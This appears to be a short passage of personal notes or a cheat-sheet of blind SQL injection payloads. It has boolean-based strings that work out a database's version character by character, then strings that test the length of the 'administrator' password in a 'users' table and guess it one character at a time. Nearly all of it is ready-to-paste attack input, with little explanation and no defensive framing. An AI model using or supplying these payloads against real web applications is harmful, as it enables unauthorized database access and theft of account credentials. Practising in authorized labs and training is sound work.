	and substring((select version()), 1, 1) = '8')
	and substring((select version()), 1, 2) = '8.')
	and substring((select version()), 1, 3) = '8.1')
	and substring((select version()), 1, 4) = '8.1.')
	and substring((select version()), 1, 5) = '8.1.2')

Length of password

	AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a

Brute-force password

	AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
	AND SUBSTRING((SELECT password FROM users WHERE username = 'Administrator'), 1, 1) > 'm
	